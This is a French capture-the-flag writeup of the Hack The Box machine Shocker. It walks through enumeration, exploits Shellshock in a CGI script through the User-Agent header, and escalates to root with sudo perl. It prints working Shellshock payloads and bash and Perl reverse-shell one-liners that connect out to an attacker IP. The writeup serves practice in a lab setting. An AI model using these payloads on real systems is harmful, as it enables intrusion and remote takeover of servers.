---
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

title: "Shocker — HTB Easy Writeup & Walkthrough"
linkTitle: "Shocker"
slug: "shocker"
date: 2025-11-21T15:40:23+01:00
#lastmod: 2025-11-21T15:40:23+01:00
draft: false

# --- PaperMod / navigation ---
type: "writeups"
summary: "CGI vulnérable, exploitation de Shellshock et escalade de privilèges jusqu’au root via sudo Perl."
description: "Writeup de Shocker (HTB Easy) : walkthrough pas à pas avec identification d’un CGI vulnérable, exploitation de Shellshock et accès root obtenu étape après étape."
tags: ["HTB-Easy","Shellshock","Perl","Linux"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Shocker sur HackTheBox vulnérable à Shellshock via un script CGI"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Shocker"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "4h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true
---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Shocker> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

Dans ce writeup, tu vas découvrir la machine **Shocker**, une box **Easy** emblématique de Hack The Box, particulièrement adaptée pour débuter et comprendre concrètement l’exploitation de la vulnérabilité **Shellshock** à travers un script CGI exposé dans le répertoire `/cgi-bin/`.

Grâce à une énumération méthodique, tu identifies progressivement le vecteur d’attaque, puis exploites le script `user.sh` pour obtenir un premier accès au système sous l’utilisateur *shelly*. La suite du challenge te permet ensuite de t’exercer à une **élévation de privilèges**, en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.

**Ce parcours met en évidence une méthode essentielle en CTF : une énumération rigoureuse, suivie d’une exploitation ciblée et maîtrisée, en s’appuyant sur des indices simples mais fiables comme la présence d’un CGI exposé.**

---

## Énumérations

Dans un challenge **CTF Hack The Box**, tu commences **toujours** par une phase d’**énumération complète**.
C’est une étape incontournable : elle te permet d’identifier clairement ce que la machine expose avant toute tentative d’exploitation.

Concrètement, tu cherches à savoir quels **ports** sont ouverts, quels **services** sont accessibles, si une **application web** est présente, quels **répertoires** sont exposés et si des **sous-domaines ou vhosts** peuvent être exploités.

Pour réaliser cette énumération de manière structurée et reproductible, tu peux t’appuyer sur trois scripts :

- **{{< script "mon-nmap" >}}** : identifie les ports ouverts et les services en écoute
- **{{< script "mon-recoweb" >}}** : énumère les répertoires et fichiers accessibles via le service web
- **{{< script "mon-subdomains" >}}** : détecte la présence éventuelle de sous-domaines et de vhosts

Tu retrouves ces outils dans la section **[Outils / Mes scripts](mes-scripts/)**.
Pour garantir des résultats pertinents en contexte **CTF HTB**, tu utilises une **wordlist dédiée**, installée au préalable grâce au script **{{< script "make-htb-wordlist" >}}**.
Cette wordlist est conçue pour couvrir les technologies couramment rencontrées sur Hack The Box.

------

Avant de lancer les scans, vérifie que writeup.htb résout bien vers la cible. Sur HTB, ça passe généralement par une entrée dans /etc/hosts.

- Ajoute l’entrée `10.129.x.x shocker.htb` dans `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

- Lance ensuite le script {{< script "mon-nmap" >}} pour obtenir une vue claire des ports et services exposés :


```bash
mon-nmap shocker.htb

# Résultats dans le répertoire scans_nmap/
#  - scans_nmap/full_tcp_scan.txt
#  - scans_nmap/aggressive_vuln_scan.txt
#  - scans_nmap/cms_vuln_scan.txt
#  - scans_nmap/udp_vuln_scan.txt
```


### Scan initial

Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :

> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (Apache, CGI et SSH).

```txt
# Nmap 7.95 scan initiated Fri Nov 21 16:15:03 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

# Nmap done at Fri Nov 21 16:15:11 2025 -- 1 IP address (1 host up) scanned in 7.47 seconds
```

### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```txt
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour shocker.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"80,2222" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "shocker.htb"

# Nmap 7.95 scan initiated Fri Nov 21 16:15:11 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p80,2222 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0070s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2222/tcp)
HOP RTT     ADDRESS
1   6.59 ms 10.10.14.xx
2   6.86 ms shocker.htb (10.129.160.126)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 21 16:15:19 2025 -- 1 IP address (1 host up) scanned in 8.41 seconds

```

### Scan ciblé CMS

Résultats du scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```txt
# Nmap 7.95 scan initiated Fri Nov 21 16:15:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p80,2222 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0072s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-headers: 
|   Date: Fri, 21 Nov 2025 15:15:26 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
|   ETag: "89-559ccac257884"
|   Accept-Ranges: bytes
|   Content-Length: 137
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 21 16:15:37 2025 -- 1 IP address (1 host up) scanned in 18.26 seconds

```



### Scan UDP rapide

Résultats du scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).

```txt
# Nmap 7.95 scan initiated Fri Nov 21 16:15:37 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0080s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at Fri Nov 21 16:15:47 2025 -- 1 IP address (1 host up) scanned in 9.43 seconds

```



### Énumération des chemins web avec `mon-recoweb`

Pour la partie découverte de chemins web, utilise le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb shocker.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier **`RESULTS_SUMMARY.txt`** te permet d’identifier rapidement les chemins intéressants sans parcourir tous les logs.


Même si le site semble vide, cette étape reste indispensable : elle permet de révéler des répertoires techniques non exposés via l’interface web, comme ici /cgi-bin/.

```txt
===== mon-recoweb-dev — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/dev/mon-recoweb-dev
Script              : mon-recoweb-dev v2.1.0

Cible        : shocker.htb
Périmètre    : /
Date début   : 2026-01-10 11:23:56

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://shocker.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://shocker.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://shocker.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/. (CODE:200|SIZE:137)
http://shocker.htb/.htaccess.bak (CODE:403|SIZE:299)
http://shocker.htb/.htaccess (CODE:403|SIZE:295)
http://shocker.htb/.htc (CODE:403|SIZE:290)
http://shocker.htb/.ht (CODE:403|SIZE:289)
http://shocker.htb/.htgroup (CODE:403|SIZE:294)
http://shocker.htb/.htm (CODE:403|SIZE:290)
http://shocker.htb/.html (CODE:403|SIZE:291)
http://shocker.htb/.htpasswd (CODE:403|SIZE:295)
http://shocker.htb/.htpasswds (CODE:403|SIZE:296)
http://shocker.htb/.htuser (CODE:403|SIZE:293)
http://shocker.htb/index.html (CODE:200|SIZE:137)
http://shocker.htb/server-status (CODE:403|SIZE:299)
http://shocker.htb/server-status/ (CODE:403|SIZE:299)

=== Détails par outil ===

[DIRB]
http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/index.html (CODE:200|SIZE:137)
http://shocker.htb/server-status (CODE:403|SIZE:299)

[FFUF — DIRECTORIES]
http://shocker.htb/server-status/ (CODE:403|SIZE:299)

[FFUF — FILES]
http://shocker.htb/. (CODE:200|SIZE:137)
http://shocker.htb/.htaccess.bak (CODE:403|SIZE:299)
http://shocker.htb/.htaccess (CODE:403|SIZE:295)
http://shocker.htb/.htc (CODE:403|SIZE:290)
http://shocker.htb/.ht (CODE:403|SIZE:289)
http://shocker.htb/.htgroup (CODE:403|SIZE:294)
http://shocker.htb/.htm (CODE:403|SIZE:290)
http://shocker.htb/.html (CODE:403|SIZE:291)
http://shocker.htb/.htpasswd (CODE:403|SIZE:295)
http://shocker.htb/.htpasswds (CODE:403|SIZE:296)
http://shocker.htb/.htuser (CODE:403|SIZE:293)
http://shocker.htb/index.html (CODE:200|SIZE:137)


```

### Recherche de vhosts avec `mon-subdomains`

Enfin, teste rapidement la présence de vhosts  avec  le script {{< script "mon-subdomains" >}}

```bash
mon-subdomains shocker.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```
Si aucun vhost distinct n’est détecté, ce fichier te permet malgré tout de confirmer que le fuzzing n’a rien révélé d’exploitable.

```txt
=== mon-subdomains shocker.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : 2026-01-09 18:45:57
Domaine      : shocker.htb
IP           : 10.129.35.201
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=137 words=13 (Host=zhd4htxy6w.shocker.htb)
  Baseline#2: code=200 size=137 words=13 (Host=trkcky4t3v.shocker.htb)
  Baseline#3: code=200 size=137 words=13 (Host=rovm8c9i6k.shocker.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains shocker.htb END ===
                                                                    
```

{{< script "mon-subdomains" >}} n'a révélé aucun vhost exploitable, ce qui confirme que l'analyse doit se concentrer sur le port 80 et ses endpoints.

## Exploitation – Prise pied (Foothold)

### Analyse de l’image

Le site web exposé par la machine est extrêmement minimaliste : il se limite à une seule page affichant une image, *bug.jpg*, sans lien, formulaire ni fonctionnalité apparente. Face à une surface d’attaque aussi réduite, il est naturel de se demander si cette image ne dissimule pas une information utile à la progression.

Tu commences donc par la télécharger et l’analyser à l’aide des outils et méthodes décrits dans la recette **{{< recette "outils-steganographie" >}}**, afin de vérifier la présence éventuelle d’un fichier embarqué, de métadonnées exploitables ou d’un indice caché.

Après avoir appliqué plusieurs techniques, en commençant notamment par **stegseek**, aucun élément pertinent n’est mis en évidence. Cette étape permet ainsi de confirmer que **l’image ne constitue pas un vecteur d’exploitation** dans ce challenge.



![Machine Shocker sur Hack The Box affichant une page web minimaliste exploitée via Shellshock sur un script CGI](shocker-shellshock-bug.jpg)

### Scan du `/cgi-bin/`

**La mise en évidence du répertoire `/cgi-bin/` est un indicateur fort : il s’agit de l’emplacement classique des scripts exécutés via le moteur CGI d’Apache, un contexte historiquement propice à l’apparition de vulnérabilités comme Shellshock.**

Conformément à ce que révèle l’énumération, tu concentres maintenant ton attention sur le répertoire `/cgi-bin/`, qui constitue un point d’entrée logique et prioritaire pour la suite de l’exploitation.


```bash
mon-recoweb shocker.htb/cgi-bin/ --ext ".sh,.cgi,.pl"
```



```txt
===== mon-recoweb-dev — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/dev/mon-recoweb-dev
Script              : mon-recoweb-dev v2.1.0

Cible        : shocker.htb
Périmètre    : /cgi-bin/
Date début   : 2026-01-10 11:26:26

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://shocker.htb/cgi-bin/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/cgi-bin/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://shocker.htb/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/cgi-bin/ffuf_dirs.json 2>&1 | tee scans_recoweb/cgi-bin/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://shocker.htb/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 30 -timeout 10 -fc 404 -e .sh\,.cgi\,.pl -of json -o scans_recoweb/cgi-bin/ffuf_files.json 2>&1 | tee scans_recoweb/cgi-bin/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/cgi-bin/.htaccess.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htaccess (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htaccess.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htaccess.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.hta.cgi (CODE:403|SIZE:302)
http://shocker.htb/cgi-bin/.hta (CODE:403|SIZE:298)
http://shocker.htb/cgi-bin/.hta.pl (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.hta.sh (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.htpasswd.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htpasswd (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htpasswd.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htpasswd.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/user.sh (CODE:200|SIZE:126)

=== Détails par outil ===

[DIRB]

[FFUF — DIRECTORIES]

[FFUF — FILES]
http://shocker.htb/cgi-bin/ (CODE:403|SIZE:294)
http://shocker.htb/cgi-bin/.htaccess.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htaccess (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htaccess.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htaccess.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.hta.cgi (CODE:403|SIZE:302)
http://shocker.htb/cgi-bin/.hta (CODE:403|SIZE:298)
http://shocker.htb/cgi-bin/.hta.pl (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.hta.sh (CODE:403|SIZE:301)
http://shocker.htb/cgi-bin/.htpasswd.cgi (CODE:403|SIZE:307)
http://shocker.htb/cgi-bin/.htpasswd (CODE:403|SIZE:303)
http://shocker.htb/cgi-bin/.htpasswd.pl (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/.htpasswd.sh (CODE:403|SIZE:306)
http://shocker.htb/cgi-bin/user.sh (CODE:200|SIZE:126)
                               
```

La présence du script `user.sh` dans le répertoire `/cgi-bin/` constitue un signal très parlant : il s’agit d’un script Bash potentiellement exécuté via CGI, un contexte classiquement associé à la vulnérabilité **Shellshock**.

Tu formules donc naturellement l’hypothèse d’une exploitation possible et passes à l’étape suivante : **vérifier concrètement si ce script est effectivement vulnérable**.

### Shellshock

Tu commences par injecter, dans l’en-tête *User-Agent*, une définition de fonction suivie d’une commande simple (`echo VULN`), conformément au [mécanisme d’exploitation de la vulnérabilité **Shellshock**](https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html).

Ce test volontairement minimal permet de valider l’hypothèse formulée précédemment : si le serveur exécute la commande et renvoie la chaîne attendue dans la réponse HTTP, cela confirme que le script CGI interprète l’en-tête comme du code Bash et qu’il est donc **vulnérable à Shellshock**.

```bash
curl -H 'User-Agent: () { :; }; echo; echo VULN' http://shocker.htb/cgi-bin/user.sh
VULN
Content-Type: text/plain
Just an uptime test script

 05:37:23 up 19:59,  0 users,  load average: 0.00, 0.00, 0.00

```

Pour renforcer la vérification, tu remplaces la commande précédente par `/usr/bin/id`. L’exécution de cette commande permet non seulement de confirmer l’exploitation de **Shellshock**, mais aussi d’identifier précisément le contexte utilisateur dans lequel le script CGI s’exécute.

Cette information est essentielle pour la suite, car elle détermine les actions possibles et oriente la stratégie d’exploitation à adopter.

```bash
curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh 
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

```

La vulnérabilité étant désormais confirmée, tu injectes [un **payload Bash de reverse shell**](https://www.revshells.com/) dans l’en-tête *User-Agent*, par exemple généré à l’aide de [revshells.com](https://www.revshells.com/).

Ce payload est exécuté via **Shellshock** par le script CGI et t'ouvre immédiatement une session distante vers ta machine Kali Linux, te fournissant ainsi un premier shell interactif sur la cible.

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh

```
**Pense à lancer ton listener avant d’envoyer le payload.**

### Reverse Shell dans Kali Linux

Dans un autre terminal sur Kali Linux :

```bash
nc -lvnp 4444                                                       
Listening on 0.0.0.0 4444
Connection received on 10.129.160.126 58744
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

Tu peux maintenant explorer le système :

```bash
shelly@Shocker:/usr/lib/cgi-bin$ ls -l
total 4
-rwxr-xr-x 1 root root 113 Sep 22  2017 user.sh
shelly@Shocker:/usr/lib/cgi-bin$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Sep 21  2022 .
drwxr-xr-x 23 root   root   4096 Sep 21  2022 ..
drwxr-xr-x  4 shelly shelly 4096 Sep 21  2022 shelly

shelly@Shocker:/usr/lib/cgi-bin$ cd ~
shelly@Shocker:/home/shelly$ ls -la
total 36
drwxr-xr-x 4 shelly shelly 4096 Sep 21  2022 .
drwxr-xr-x 3 root   root   4096 Sep 21  2022 ..
lrwxrwxrwx 1 root   root      9 Sep 21  2022 .bash_history -> /dev/null
-rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
drwx------ 2 shelly shelly 4096 Sep 21  2022 .cache
drwxrwxr-x 2 shelly shelly 4096 Sep 21  2022 .nano
-rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
-rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
-r--r--r-- 1 root   root     33 Nov 21 09:38 user.txt

```

### user.txt

```bash
shelly@Shocker:/home/shelly$ cat user.txt
caf00xxxxxxxxxxxxxxxxxxxxxxxxxxxe4a7
shelly@Shocker:/home/shelly$
```



---

## Escalade de privilèges

Une fois connecté en SSH en tant que `shelly`, tu appliques la méthodologie décrite dans la recette
   {{< recette "privilege-escalation-linux" >}}.

La première étape consiste toujours à vérifier les droits `sudo` :

### sudo -l

Commence par un classique `sudo -l`

```bash
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$
```

### sudo perl

Puisque l’utilisateur `shelly` est autorisé à exécuter des commandes **Perl** avec les privilèges **root** via `sudo`, tu peux exploiter cette configuration pour élever tes privilèges.

Pour cela, tu utilises un **payload Bash encapsulé en Perl**, par exemple généré depuis [revshells.com](https://www.revshells.com/), et l’exécutes via `sudo perl`. Cette technique te permet d’obtenir un shell avec les droits root de manière directe et contrôlée.

```bash
shelly@Shocker:/home/shelly$perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

### Root Shell dans Kali Linux

```bash
nc -lvnp 12345                                                      
Listening on 0.0.0.0 12345
Connection received on 10.129.160.126 34840
root@Shocker:/home/shelly# 
```

Tu obtiens alors un shell **bash** avec les privilèges **root**, que tu peux stabiliser à l’aide de la recette {{< recette "stabiliser-reverse-shell" >}} afin de travailler dans un environnement plus confortable.

### root.txt

Une fois connecté en tant que root, il ne te reste plus qu’à aller à l’essentiel et afficher le contenu du fichier `root.txt`.

```bash
root@Shocker:/home/shelly# cat /root/root.txt
cat /root/root.txt
be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef

```



---

## Conclusion

Cette machine illustre parfaitement l’importance d’une **énumération structurée** et d’une **lecture attentive des indices**, même lorsque la surface d’attaque semble, au premier abord, quasi inexistante.

À partir d’une interface web minimaliste, la découverte du répertoire `/cgi-bin/` t’oriente vers une piste classique mais toujours pertinente : **les scripts CGI potentiellement vulnérables à Shellshock**. En validant progressivement l’hypothèse — test de la faille, exécution de commandes simples, puis obtention d’un reverse shell — tu accèdes au système en tant qu’utilisateur avant de conclure par une **élévation de privilèges directe et maîtrisée** via `sudo` et Perl.

**Un challenge Easy idéal pour débuter, qui montre qu’une vulnérabilité historique comme Shellshock reste exploitable lorsqu’elle n’est pas correctement corrigée, et qu’en CTF, une bonne méthode vaut souvent plus qu’une batterie d’outils.**

{{< feedback >}}
